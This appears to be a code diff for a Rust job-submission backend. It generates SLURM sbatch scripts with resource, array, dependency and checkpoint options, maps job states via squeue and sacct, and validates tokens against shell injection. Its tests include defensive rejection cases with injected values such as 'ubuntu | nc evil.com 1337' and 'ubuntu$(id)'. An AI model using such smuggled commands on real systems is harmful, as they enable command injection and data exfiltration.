@@ -3,6 +3,26 @@
 //! Routes jobs to user-provided infrastructure — SSH-accessible machines,
 //! Kubernetes clusters, or SLURM schedulers. The BYOC backend translates
 //! PRISM job specs into the target system's native submission format.
+//!
+//! # SLURM checkpoint contract
+//!
+//! With checkpointing enabled (the default) the sbatch script carries
+//! `#SBATCH --signal=B:USR1@60` and `#SBATCH --requeue`. The contract for
+//! the image entrypoint (`/entrypoint.sh`) is:
+//!
+//! 1. Install `trap 'handler' USR1` before any work begins.
+//! 2. On USR1 (60 s before the wall limit), atomically write a checkpoint
+//!    to caller-configured storage that survives the allocation, then exit
+//!    with code 140. Node-local `/tmp` is not durable checkpoint storage.
+//! 3. The sbatch body observes exit 140 and calls
+//!    `scontrol requeue $SLURM_JOB_ID`, putting the job back in the queue;
+//!    the next start must locate and resume the durable checkpoint.
+//!
+//! Any other exit code behaves normally (0 = success, else failure).
+//! Sites whose scheduler forbids `scontrol requeue` from the job can
+//! disable checkpointing via [`SlurmCheckpoint::disabled`]; the flags are
+//! then omitted entirely. Container images must be pulled or built on the
+//! login node before submission and supplied as a shared `.sif` path.
 
 use anyhow::{Context, Result, bail};
 use async_trait::async_trait;
@@ -28,7 +48,73 @@ pub enum ByocTarget {
         head_node: String,
         user: String,
         partition: String,
+        /// Resource request, arrays, dependencies, checkpointing and
+        /// container strategy. `#[serde(default)]`: targets serialized
+        /// before this field existed deserialize as an empty config.
+        #[serde(default)]
+        config: Box<SlurmJobConfig>,
     },
+}
+
+/// Checkpoint/requeue behavior for SLURM jobs.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+pub struct SlurmCheckpoint {
+    /// Emit `--signal=B:USR1@<lead>` + `--requeue`. See module docs for
+    /// the entrypoint contract.
+    pub enabled: bool,
+    /// Seconds of warning before the wall limit (default 60).
+    pub signal_lead_secs: u32,
+}
+
+impl Default for SlurmCheckpoint {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            signal_lead_secs: 60,
+        }
+    }
+}
+
+impl SlurmCheckpoint {
+    pub fn disabled() -> Self {
+        Self {
+            enabled: false,
+            signal_lead_secs: 60,
+        }
+    }
+}
+
+/// Typed SLURM resource and submission configuration. Absent allocation
+/// fields are omitted from the sbatch script entirely (never emitted empty —
+/// allocation-based clusters reject malformed directives).
+#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
+pub struct SlurmJobConfig {
+    /// `--account` — required on most allocation-based facilities.
+    pub account: Option<String>,
+    /// `--time` wall limit, e.g. `04:00:00`.
+    pub time: Option<String>,
+    /// `--gres`, e.g. `gpu:2`.
+    pub gres: Option<String>,
+    /// `--mem`, e.g. `64G`. Mutually exclusive with `mem_per_cpu`.
+    pub mem: Option<String>,
+    /// `--mem-per-cpu`. Mutually exclusive with `mem`.
+    pub mem_per_cpu: Option<String>,
+    /// `--cpus-per-task`.
+    pub cpus_per_task: Option<u32>,
+    /// `--nodes`.
+    pub nodes: Option<u32>,
+    /// `--ntasks`.
+    pub ntasks: Option<u32>,
+    /// `--array`, e.g. `0-511` or `0-511%64`.
+    pub array: Option<String>,
+    /// `--dependency=afterok:<id>` — a SLURM job id, not a PRISM uuid.
+    pub dependency_afterok: Option<u64>,
+    #[serde(default)]
+    pub checkpoint: SlurmCheckpoint,
+    /// Pre-staged `.sif` path on a filesystem visible to compute nodes.
+    /// PRISM never performs a registry pull during SLURM submission.
+    #[serde(default)]
+    pub sif_path: String,
 }
 
 impl Default for ByocTarget {
@@ -65,6 +151,17 @@ impl ByocBackend {
             "-p",
             &port.to_string(),
             &format!("{user}@{host}"),
+        ]);
+        cmd
+    }
+
+    fn slurm_ssh(head_node: &str, user: &str, remote_command: &str) -> tokio::process::Command {
+        let mut cmd = tokio::process::Command::new("ssh");
+        cmd.args([
+            "-o",
+            "BatchMode=yes",
+            &format!("{user}@{head_node}"),
+            remote_command,
         ]);
         cmd
     }
@@ -173,54 +270,20 @@ impl ComputeBackend for ByocBackend {
                 head_node,
                 user,
                 partition,
+                config,
             } => {
                 let job_id = Uuid::new_v4();
                 let inputs_json = serde_json::to_string(&plan.inputs)?;
 
-                // Same image validation as the SSH path. The SLURM script
-                // executes `singularity exec docker://{image}` on the head
-                // node — without validation an LLM-controlled image
-                // string would land in the SBATCH script and run on
-                // the cluster. See Bug #54.
-                if !is_valid_docker_image(&plan.image) {
-                    bail!(
-                        "invalid docker image reference {:?}: must match \
-                         [A-Za-z0-9._/:@-]+",
-                        plan.image
-                    );
-                }
-
-                // SSH to SLURM head node → sbatch a singularity/docker job.
-                // PRISM_INPUTS uses the same single-quote-escape helper
-                // as the SSH path so JSON apostrophes can't break out.
-                let sbatch_script = format!(
-                    "#!/bin/bash\n\
-                     #SBATCH --job-name=prism-{job_id}\n\
-                     #SBATCH --partition={partition}\n\
-                     #SBATCH --output=/tmp/prism-{job_id}.out\n\
-                     export PRISM_JOB_ID={job_id}\n\
-                     export PRISM_INPUTS={inputs_q}\n\
-                     singularity exec docker://{image} /entrypoint.sh\n",
-                    image = plan.image,
-                    inputs_q = sh_single_quote(&inputs_json),
-                );
-
-                let ssh_cmd = format!("echo '{}' | sbatch", sbatch_script.replace('\'', "'\\''"));
+                let script = sbatch_script(&job_id, partition, config, &inputs_json)?;
+                let ssh_command = format!("echo '{}' | sbatch", script.replace('\'', "'\\''"));
 
                 tracing::info!(
                     %head_node, %user, %partition, %job_id,
                     "BYOC SLURM: submitting job"
                 );
 
-                let mut cmd = tokio::process::Command::new("ssh");
-                cmd.args([
-                    "-o",
-                    "BatchMode=yes",
-                    &format!("{user}@{head_node}"),
-                    &ssh_cmd,
-                ]);
-
-                let output = cmd
+                let output = Self::slurm_ssh(head_node, user, &ssh_command)
                     .output()
                     .await
                     .context("SSH to SLURM head node failed")?;
@@ -283,23 +346,43 @@ impl ComputeBackend for ByocBackend {
             ByocTarget::Slurm {
                 head_node, user, ..
             } => {
-                let mut cmd = tokio::process::Command::new("ssh");
-                cmd.args([
-                    "-o",
-                    "BatchMode=yes",
-                    &format!("{user}@{head_node}"),
-                    &format!("squeue --name=prism-{job_id} --noheader -o %T"),
-                ]);
-                let output = cmd.output().await?;
-                let state = String::from_utf8_lossy(&output.stdout).trim().to_string();
-                match state.as_str() {
-                    "RUNNING" => Ok(JobStatus::Running { progress: 0.0 }),
-                    "PENDING" => Ok(JobStatus::Queued),
-                    "COMPLETED" => Ok(JobStatus::Completed),
-                    "FAILED" | "CANCELLED" => Ok(JobStatus::Failed { error: state }),
-                    "" => Ok(JobStatus::Completed), // job no longer in queue = done
-                    _ => Ok(JobStatus::Running { progress: 0.0 }),
+                let squeue_command = format!("squeue --name=prism-{job_id} --noheader -o %T");
+                let squeue = Self::slurm_ssh(head_node, user, &squeue_command)
+                    .output()
+                    .await
+                    .context("SSH squeue status query failed")?;
+                let squeue_stdout = String::from_utf8_lossy(&squeue.stdout);
+                let squeue_stderr = String::from_utf8_lossy(&squeue.stderr);
+
+                if !squeue.status.success() {
+                    return interpret_slurm_status(false, squeue_stderr.trim(), "", None, "", &[]);
                 }
+                if !parse_slurm_states(&squeue_stdout).is_empty() {
+                    return interpret_slurm_status(true, "", &squeue_stdout, None, "", &[]);
+                }
+
+                // squeue only contains active jobs. sacct is authoritative
+                // after a job leaves the queue and distinguishes completion
+                // from a UUID the cluster has never seen.
+                let sacct_command = format!(
+                    "sacct -X --name=prism-{job_id} --starttime=1970-01-01 \
+                     --noheader --parsable2 --format=State"
+                );
+                let sacct = Self::slurm_ssh(head_node, user, &sacct_command)
+                    .output()
+                    .await
+                    .context("SSH sacct status query failed")?;
+                let sacct_stdout = String::from_utf8_lossy(&sacct.stdout);
+                let sacct_stderr = String::from_utf8_lossy(&sacct.stderr);
+                let sacct_states = parse_slurm_states(&sacct_stdout);
+                interpret_slurm_status(
+                    true,
+                    "",
+                    "",
+                    Some(sacct.status.success()),
+                    sacct_stderr.trim(),
+                    &sacct_states,
+                )
             }
         }
     }
@@ -340,17 +423,25 @@ impl ComputeBackend for ByocBackend {
                 }
             }
             ByocTarget::Slurm {
-                head_node, user, ..
+                head_node,
+                user,
+                config,
+                ..
             } => {
-                let mut cmd = tokio::process::Command::new("ssh");
-                cmd.args([
-                    "-o",
-                    "BatchMode=yes",
-                    &format!("{user}@{head_node}"),
-                    &format!("cat /tmp/prism-{job_id}.out"),
-                ]);
-                let output = cmd.output().await?;
-                let logs = String::from_utf8_lossy(&output.stdout).to_string();
+                let result_path = if config.array.is_some() {
+                    format!("prism-{job_id}-*.out")
+                } else {
+                    format!("prism-{job_id}.out")
+                };
+                let output = Self::slurm_ssh(head_node, user, &format!("cat {result_path}"))
+                    .output()
+                    .await
+                    .context("SSH SLURM results query failed")?;
+                if !output.status.success() {
+                    let stderr = String::from_utf8_lossy(&output.stderr);
+                    bail!("SLURM results query failed: {stderr}");
+                }
+                let logs = String::from_utf8(output.stdout).context("non-UTF-8 SLURM output")?;
                 match serde_json::from_str(&logs) {
                     Ok(v) => Ok(v),
                     Err(_) => Ok(serde_json::json!({"output": logs})),
@@ -389,17 +480,289 @@ impl ComputeBackend for ByocBackend {
             ByocTarget::Slurm {
                 head_node, user, ..
             } => {
-                let mut cmd = tokio::process::Command::new("ssh");
-                cmd.args([
-                    "-o",
-                    "BatchMode=yes",
-                    &format!("{user}@{head_node}"),
-                    &format!("scancel --name=prism-{job_id}"),
-                ]);
-                cmd.output().await.context("scancel failed")?;
+                let output =
+                    Self::slurm_ssh(head_node, user, &format!("scancel --name=prism-{job_id}"))
+                        .output()
+                        .await
+                        .context("SSH scancel failed")?;
+                if !output.status.success() {
+                    let stderr = String::from_utf8_lossy(&output.stderr);
+                    bail!("scancel failed: {stderr}");
+                }
                 Ok(())
             }
         }
+    }
+}
+
+// ── SLURM script generation (pure, unit-tested) ─────────────────────────
+
+/// Charset for any value interpolated into an `#SBATCH` directive or the
+/// script body: alphanumerics plus the separators real SLURM tokens use.
+/// Rejects quotes, newlines, `$`, backticks and shell metacharacters so a
+/// caller-supplied account/gres/array string can never become code.
+fn is_valid_slurm_token(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 128
+        && s.chars().all(|c| {
+            c.is_ascii_alphanumeric()
+                || matches!(c, ':' | '_' | '=' | ',' | '.' | '%' | '+' | '-' | '@' | '/')
+        })
+}
+
+/// Validate a `.sif` path: same token charset (paths need `/` and `.`),
+/// no shell metacharacters.
+fn is_valid_sif_path(s: &str) -> bool {
+    is_valid_slurm_token(s) && s.ends_with(".sif")
+}
+
+/// Build the `#SBATCH` directive lines for a job. Absent fields are
+/// omitted, never emitted empty. Errors on invalid or mutually
+/// exclusive values instead of guessing.
+fn sbatch_directives(job_id: &Uuid, partition: &str, cfg: &SlurmJobConfig) -> Result<Vec<String>> {
+    if !is_valid_slurm_token(partition) {
+        bail!("invalid SLURM partition {partition:?}");
+    }
+    let mut d = vec![
+        format!("#SBATCH --job-name=prism-{job_id}"),
+        format!("#SBATCH --partition={partition}"),
+    ];
+    if let Some(account) = &cfg.account {
+        if !is_valid_slurm_token(account) {
+            bail!("invalid SLURM account {account:?}");
+        }
+        d.push(format!("#SBATCH --account={account}"));
+    }
+    if let Some(time) = &cfg.time {
+        if !is_valid_slurm_token(time) {
+            bail!("invalid SLURM time {time:?}");
+        }
+        d.push(format!("#SBATCH --time={time}"));
+    }
+    if let Some(gres) = &cfg.gres {
+        if !is_valid_slurm_token(gres) {
+            bail!("invalid SLURM gres {gres:?}");
+        }
+        d.push(format!("#SBATCH --gres={gres}"));
+    }
+    match (&cfg.mem, &cfg.mem_per_cpu) {
+        (Some(mem), None) => {
+            if !is_valid_slurm_token(mem) {
+                bail!("invalid SLURM mem {mem:?}");
+            }
+            d.push(format!("#SBATCH --mem={mem}"));
+        }
+        (None, Some(mpc)) => {
+            if !is_valid_slurm_token(mpc) {
+                bail!("invalid SLURM mem-per-cpu {mpc:?}");
+            }
+            d.push(format!("#SBATCH --mem-per-cpu={mpc}"));
+        }
+        (Some(_), Some(_)) => {
+            bail!("SLURM --mem and --mem-per-cpu are mutually exclusive; set one");
+        }
+        (None, None) => {}
+    }
+    for (flag, value) in [
+        ("cpus-per-task", cfg.cpus_per_task),
+        ("nodes", cfg.nodes),
+        ("ntasks", cfg.ntasks),
+    ] {
+        if let Some(value) = value {
+            if value == 0 {
+                bail!("SLURM --{flag} must be greater than zero");
+            }
+            d.push(format!("#SBATCH --{flag}={value}"));
+        }
+    }
+    if let Some(array) = &cfg.array {
+        if !is_valid_slurm_token(array) {
+            bail!("invalid SLURM array spec {array:?}");
+        }
+        d.push(format!("#SBATCH --array={array}"));
+    }
+    if let Some(dep) = cfg.dependency_afterok {
+        if dep == 0 {
+            bail!("SLURM dependency job id must be greater than zero");
+        }
+        d.push(format!("#SBATCH --dependency=afterok:{dep}"));
+    }
+    if cfg.checkpoint.enabled {
+        if cfg.checkpoint.signal_lead_secs == 0 {
+            bail!("SLURM checkpoint signal lead must be greater than zero");
+        }
+        d.push(format!(
+            "#SBATCH --signal=B:USR1@{}",
+            cfg.checkpoint.signal_lead_secs
+        ));
+        d.push("#SBATCH --requeue".to_string());
+    }
+    Ok(d)
+}
+
+/// Build the full sbatch script. It only executes a pre-staged,
+/// compute-node-visible `.sif`; it never performs a registry pull.
+fn sbatch_script(
+    job_id: &Uuid,
+    partition: &str,
+    cfg: &SlurmJobConfig,
+    inputs_json: &str,
+) -> Result<String> {
+    let mut directives = sbatch_directives(job_id, partition, cfg)?;
+    // Relative output paths resolve under sbatch's shared submission
+    // directory; login-node result queries can read the same files.
+    directives.push(if cfg.array.is_some() {
+        format!("#SBATCH --output=prism-{job_id}-%A_%a.out")
+    } else {
+        format!("#SBATCH --output=prism-{job_id}.out")
+    });
+    if !is_valid_sif_path(&cfg.sif_path) {
+        bail!("invalid pre-staged .sif path {:?}", cfg.sif_path);
+    }
+    let sif = &cfg.sif_path;
+
+    let mut body = String::from("#!/bin/bash\n");
+    for directive in &directives {
+        body.push_str(directive);
+        body.push('\n');
+    }
+    body.push_str(&format!("export PRISM_JOB_ID={job_id}\n"));
+    body.push_str(&format!(
+        "export PRISM_INPUTS={}\n",
+        sh_single_quote(inputs_json)
+    ));
+    body.push_str(&format!(
+        "if [ ! -f {sif} ]; then echo 'prism: staged .sif not found: {sif}' >&2; exit 1; fi\n"
+    ));
+
+    if cfg.checkpoint.enabled {
+        // `B:` signals the batch shell, so explicitly forward USR1 to
+        // Singularity. Exit 140 means the entrypoint persisted a durable
+        // checkpoint and requests requeue, as documented above.
+        body.push_str("prism_finish() {\n");
+        body.push_str("  rc=$1\n");
+        body.push_str(
+            "  if [ $rc -eq 140 ]; then scontrol requeue \"$SLURM_JOB_ID\" || exit $?; exit 0; fi\n",
+        );
+        body.push_str("  exit $rc\n");
+        body.push_str("}\n");
+        body.push_str("prism_forward_usr1() {\n");
+        body.push_str("  kill -USR1 \"$prism_child_pid\"\n");
+        body.push_str("  wait \"$prism_child_pid\"\n");
+        body.push_str("  prism_finish $?\n");
+        body.push_str("}\n");
+        body.push_str("trap prism_forward_usr1 USR1\n");
+        body.push_str(&format!("singularity exec {sif} /entrypoint.sh &\n"));
+        body.push_str("prism_child_pid=$!\n");
+        body.push_str("wait \"$prism_child_pid\"\n");
+        body.push_str("prism_finish $?\n");
+    } else {
+        body.push_str(&format!("singularity exec {sif} /entrypoint.sh\n"));
+    }
+    Ok(body)
+}
+
+/// Map one `sacct` State value. `None` = state PRISM does not recognize;
+/// the caller must not guess and must surface the raw value.
+fn parse_slurm_states(output: &str) -> Vec<String> {
+    output
+        .lines()
+        .filter_map(|line| {
+            let state = line.split('|').next().unwrap_or(line).trim();
+            (!state.is_empty()).then(|| state.to_string())
+        })
+        .collect()
+}
+
+fn map_sacct_state(state: &str) -> Option<JobStatus> {
+    // sacct states can carry suffixes like `COMPLETED (exit 0)`; the
+    // caller passes the first whitespace-delimited word.
+    match state.trim_end_matches('+') {
+        "COMPLETED" => Some(JobStatus::Completed),
+        "PENDING" | "CONFIGURING" | "REQUEUED" | "REQUEUE_FED" | "RESV_DEL_HOLD" => {
+            Some(JobStatus::Queued)
+        }
+        "RUNNING" | "COMPLETING" | "SUSPENDED" | "STAGE_OUT" => {
+            Some(JobStatus::Running { progress: 0.0 })
+        }
+        "CANCELLED" => Some(JobStatus::Cancelled),
+        "FAILED" | "TIMEOUT" | "NODE_FAIL" | "OUT_OF_MEMORY" | "PREEMPTED" | "BOOT_FAIL"
+        | "DEADLINE" | "REVOKED" => Some(JobStatus::Failed {
+            error: state.trim_end_matches('+').to_string(),
+        }),
+        _ => None,
+    }
+}
+
+/// Fold `sacct` states of a job (array jobs yield several rows): any
+/// failure dominates, then cancellation, then live states, then queued,
+/// then completion. Unknown states are an error, not a guess.
+fn fold_sacct_states(states: &[String]) -> Result<JobStatus> {
+    let mut any_failed = None;
+    let mut any_cancelled = false;
+    let mut any_running = false;
+    let mut any_queued = false;
+    let mut any_completed = false;
+    for st in states {
+        let word = st.split_whitespace().next().unwrap_or(st);
+        match map_sacct_state(word) {
+            Some(JobStatus::Failed { error }) => any_failed = Some(error),
+            Some(JobStatus::Cancelled) => any_cancelled = true,
+            Some(JobStatus::Running { .. }) => any_running = true,
+            Some(JobStatus::Queued) => any_queued = true,
+            Some(JobStatus::Completed) => any_completed = true,
+            None => bail!("unrecognized sacct state {st:?} — not mapping it to a status"),
+        }
+    }
+    if let Some(error) = any_failed {
+        Ok(JobStatus::Failed { error })
+    } else if any_cancelled {
+        Ok(JobStatus::Cancelled)
+    } else if any_running {
+        Ok(JobStatus::Running { progress: 0.0 })
+    } else if any_queued {
+        Ok(JobStatus::Queued)
+    } else if any_completed {
+        Ok(JobStatus::Completed)
+    } else {
+        bail!("sacct returned no interpretable states");
+    }
+}
+
+/// Pure status decision for the SLURM arm. Transport failures and
+/// unknown jobs are errors; an empty `squeue` alone never means
+/// "completed" — `sacct` decides.
+///
+/// * `squeue_ok = false`  → SSH/squeue transport failure → `Err`.
+/// * `squeue_state` non-empty → live state mapping (unknown ⇒ `Err`).
+/// * `squeue_state` empty:
+///   - `sacct_ok = None`  → programming error → `Err`.
+///   - `sacct_ok = Some(false)` → sacct transport failure → `Err`.
+///   - `sacct_states` empty → cluster has never seen the job → `Err`.
+///   - otherwise → folded `sacct` states.
+fn interpret_slurm_status(
+    squeue_ok: bool,
+    squeue_err: &str,
+    squeue_output: &str,
+    sacct_ok: Option<bool>,
+    sacct_err: &str,
+    sacct_states: &[String],
+) -> Result<JobStatus> {
+    if !squeue_ok {
+        bail!("squeue over SSH failed: {squeue_err}");
+    }
+    let active_states = parse_slurm_states(squeue_output);
+    if !active_states.is_empty() {
+        return fold_sacct_states(&active_states);
+    }
+
+    match sacct_ok {
+        None => bail!("job absent from squeue but sacct was not consulted"),
+        Some(false) => bail!("sacct over SSH failed: {sacct_err}"),
+        Some(true) if sacct_states.is_empty() => {
+            bail!("job not found in squeue or sacct — unknown to this cluster")
+        }
+        Some(true) => fold_sacct_states(sacct_states),
     }
 }
 
@@ -464,6 +827,7 @@ mod tests {
             head_node: "hpc.lab.internal".into(),
             user: "researcher".into(),
             partition: "gpu".into(),
+            config: Box::new(SlurmJobConfig::default()),
         };
         let json = serde_json::to_string(&target).unwrap();
         let back: ByocTarget = serde_json::from_str(&json).unwrap();
@@ -551,5 +915,191 @@ mod tests {
         assert!(!is_valid_docker_image("ubuntu$(id)"));
         assert!(!is_valid_docker_image("ubuntu | nc evil.com 1337"));
         assert!(!is_valid_docker_image(&"a".repeat(257)));
+    }
+
+    fn slurm_config(sif_path: &str) -> SlurmJobConfig {
+        SlurmJobConfig {
+            checkpoint: SlurmCheckpoint::disabled(),
+            sif_path: sif_path.into(),
+            ..SlurmJobConfig::default()
+        }
+    }
+
+    #[test]
+    fn slurm_script_emits_all_configured_resources_array_and_dependency() {
+        let job_id = Uuid::parse_str("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa").unwrap();
+        let config = SlurmJobConfig {
+            account: Some("esa-materials".into()),
+            time: Some("02:30:00".into()),
+            gres: Some("gpu:a100:2".into()),
+            mem: Some("128G".into()),
+            mem_per_cpu: None,
+            cpus_per_task: Some(16),
+            nodes: Some(2),
+            ntasks: Some(8),
+            array: Some("0-15%4".into()),
+            dependency_afterok: Some(98765),
+            checkpoint: SlurmCheckpoint::default(),
+            sif_path: "/shared/images/prism-worker.sif".into(),
+        };
+
+        let script = sbatch_script(&job_id, "gpu", &config, r#"{"temperature":1200}"#).unwrap();
+
+        for directive in [
+            "#SBATCH --partition=gpu",
+            "#SBATCH --account=esa-materials",
+            "#SBATCH --time=02:30:00",
+            "#SBATCH --gres=gpu:a100:2",
+            "#SBATCH --mem=128G",
+            "#SBATCH --cpus-per-task=16",
+            "#SBATCH --nodes=2",
+            "#SBATCH --ntasks=8",
+            "#SBATCH --array=0-15%4",
+            "#SBATCH --dependency=afterok:98765",
+            "#SBATCH --signal=B:USR1@60",
+            "#SBATCH --requeue",
+        ] {
+            assert!(script.contains(directive), "missing {directive}\n{script}");
+        }
+        assert!(script.contains("singularity exec /shared/images/prism-worker.sif"));
+        assert!(script.contains("kill -USR1 \"$prism_child_pid\""));
+        assert!(
+            script
+                .contains("#SBATCH --output=prism-aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa-%A_%a.out")
+        );
+        assert!(!script.contains("docker://"));
+        assert!(!script.contains("singularity pull"));
+    }
+
+    #[test]
+    fn slurm_script_omits_absent_resources_and_empty_flags() {
+        let config = slurm_config("/shared/prism.sif");
+        let script = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap();
+
+        for flag in [
+            "--account",
+            "--time",
+            "--gres",
+            "--mem",
+            "--mem-per-cpu",
+            "--cpus-per-task",
+            "--nodes",
+            "--ntasks",
+            "--array",
+            "--dependency",
+            "--signal",
+            "--requeue",
+        ] {
+            assert!(!script.contains(flag), "unexpected {flag}\n{script}");
+        }
+        assert!(!script.lines().any(|line| line.ends_with('=')));
+    }
+
+    #[test]
+    fn slurm_script_supports_memory_per_cpu_and_rejects_both_memory_modes() {
+        let mut config = slurm_config("/shared/prism.sif");
+        config.mem_per_cpu = Some("8G".into());
+        let script = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap();
+        assert!(script.contains("#SBATCH --mem-per-cpu=8G"));
+        assert!(!script.contains("#SBATCH --mem="));
+
+        config.mem = Some("64G".into());
+        let error = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap_err();
+        assert!(error.to_string().contains("mutually exclusive"));
+    }
+
+    #[test]
+    fn slurm_script_rejects_empty_configured_values() {
+        let mut config = slurm_config("/shared/prism.sif");
+        config.account = Some(String::new());
+        let error = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap_err();
+        assert!(error.to_string().contains("invalid SLURM account"));
+    }
+
+    #[test]
+    fn slurm_script_rejects_zero_resource_counts() {
+        let mut config = slurm_config("/shared/prism.sif");
+        config.nodes = Some(0);
+        let error = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap_err();
+        assert!(
+            error
+                .to_string()
+                .contains("--nodes must be greater than zero")
+        );
+    }
+
+    #[test]
+    fn slurm_script_requires_a_prestaged_sif_path() {
+        let config = slurm_config("registry.example/prism:latest");
+        let error = sbatch_script(&Uuid::nil(), "gpu", &config, "{}").unwrap_err();
+        assert!(error.to_string().contains("pre-staged .sif path"));
+    }
+
+    #[test]
+    fn slurm_status_uses_sacct_after_job_leaves_squeue() {
+        let states = parse_slurm_states("COMPLETED|\n");
+        let status = interpret_slurm_status(true, "", "", Some(true), "", &states).unwrap();
+        assert!(matches!(status, JobStatus::Completed));
+    }
+
+    #[test]
+    fn slurm_status_does_not_treat_not_found_or_transport_failure_as_completed() {
+        let not_found = interpret_slurm_status(true, "", "", Some(true), "", &[]).unwrap_err();
+        assert!(not_found.to_string().contains("not found"));
+
+        let ssh_error =
+            interpret_slurm_status(false, "connection reset", "", None, "", &[]).unwrap_err();
+        assert!(ssh_error.to_string().contains("connection reset"));
+
+        let sacct_error =
+            interpret_slurm_status(true, "", "", Some(false), "accounting unavailable", &[])
+                .unwrap_err();
+        assert!(sacct_error.to_string().contains("accounting unavailable"));
+    }
+
+    #[test]
+    fn slurm_status_rejects_unrecognized_squeue_state() {
+        let err = interpret_slurm_status(true, "", "WEIRD_NEW_STATE\n", None, "", &[]).unwrap_err();
+        assert!(err.to_string().contains("WEIRD_NEW_STATE"));
+    }
+
+    #[test]
+    fn slurm_target_deserializes_without_config_field() {
+        // Targets serialized before `config` existed still parse. Their
+        // empty container config then fails closed at submission instead of
+        // restoring the old compute-node registry pull.
+        let json = serde_json::json!({
+            "Slurm": {
+                "head_node": "hpc.lab.internal",
+                "user": "researcher",
+                "partition": "gpu"
+            }
+        });
+        let back: ByocTarget = serde_json::from_value(json).unwrap();
+        if let ByocTarget::Slurm { config, .. } = back {
+            assert_eq!(*config, SlurmJobConfig::default());
+        } else {
+            panic!("expected Slurm");
+        }
+    }
+
+    #[test]
+    fn slurm_status_maps_active_array_and_terminal_states() {
+        assert!(matches!(
+            interpret_slurm_status(true, "", "PENDING\n", None, "", &[]).unwrap(),
+            JobStatus::Queued
+        ));
+        assert!(matches!(
+            interpret_slurm_status(true, "", "COMPLETED\nRUNNING\n", None, "", &[]).unwrap(),
+            JobStatus::Running { .. }
+        ));
+        let cancelled = parse_slurm_states("CANCELLED|\n");
+        assert!(matches!(
+            interpret_slurm_status(true, "", "", Some(true), "", &cancelled).unwrap(),
+            JobStatus::Cancelled
+        ));
+        let failed_states = parse_slurm_states("OUT_OF_MEMORY|\n");
+        let failed = interpret_slurm_status(true, "", "", Some(true), "", &failed_states).unwrap();
+        assert!(matches!(failed, JobStatus::Failed { error } if error == "OUT_OF_MEMORY"));
     }
 }
